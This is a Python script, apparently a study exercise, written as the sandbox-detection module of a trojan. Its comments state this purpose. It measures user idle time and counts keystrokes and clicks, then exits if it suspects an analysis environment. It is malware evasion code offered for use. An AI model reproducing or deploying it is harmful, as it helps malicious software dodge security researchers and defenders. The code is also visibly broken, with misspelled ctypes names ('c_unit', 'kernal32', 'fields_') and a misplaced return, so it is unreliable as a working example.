from ctypes import byref, c_unit, c_ulong, sizeof, Structure, windll
import random
import struct
import sys
import time
import win32api

# This script is to detect whether the system out trojan is on is in a sandbox environment and we perform checks
# on whether this is the case, such as performing rapid amounts of clicks and we also determine the last time the user
# interacted with the machine vs how long the machine has been running, which can give us a good idea if we are in a
# sandbox environment or not
class LASTINPUTINFO(Structure):
    fields_=[('cbSize', c_unit), ('dwTime', c_ulong)]

#originally had this method inside of the class above it, but since this function is being accessed in another class
# i could not actually access it, but moving the function outside of the class made it possible
def get_last_input():
        struct_lastinputinfo = LASTINPUTINFO()
        struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
        windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
        run_time = windll.kernal32.GetTickCount()
        elapsed = run_time - struct_lastinputinfo.dwTime
        print(f"[*] It's been {elapsed} milliseconds since the last event.")
        return elapsed

class Detector:
    def __init__(self):
        self.double_clicks = 0
        self.keystrokes = 0
        self.mouse_clicks = 0

    def get_key_press(self):
        for i in range(0, 0xff):
            state = win32api.GetAsyncKeyState(i)
            if state & 0x0001:
                if i == 0x1:
                    self.mouse_clicks += 1
                    return time.time()
                elif i > 32 and i < 127:
                    self.keystrokes += 1
            return None

    def detect(self):
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.35

        max_double_clicks = 10
        max_keystrokes = random.randint(10,25)
        max_mouse_clicks = random.randint(5,25)
        max_input_threshokd = 30000

        last_input = get_last_input()
        if last_input >= max_input_threshokd:
            sys.exit(0)

        detection_complete = False
        while not detection_complete:
            keypress_time = self.get_key_press()
            if keypress_time is not None and previous_timestamp is not None:
                elapsed = keypress_time - previous_timestamp

                if elapsed <= double_click_threshold:
                    self.mouse_clicks -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()
                    else:
                        if self.double_clicks >= max_double_clicks:
                            if (keypress_time - first_double_click <= (max_double_clicks*double_click_threshold)):
                                sys.exit(0)
                if (self.keystrokes >= max_keystrokes and self.double_clicks >= max_double_clicks):
                    detection_complete = True

                previous_timestamp = keypress_time
            elif keypress_time is not None:
                previous_timestamp = keypress_time

if __name__ == '__main__':
    d = Detector()
    d.detect()
    print('ok.')
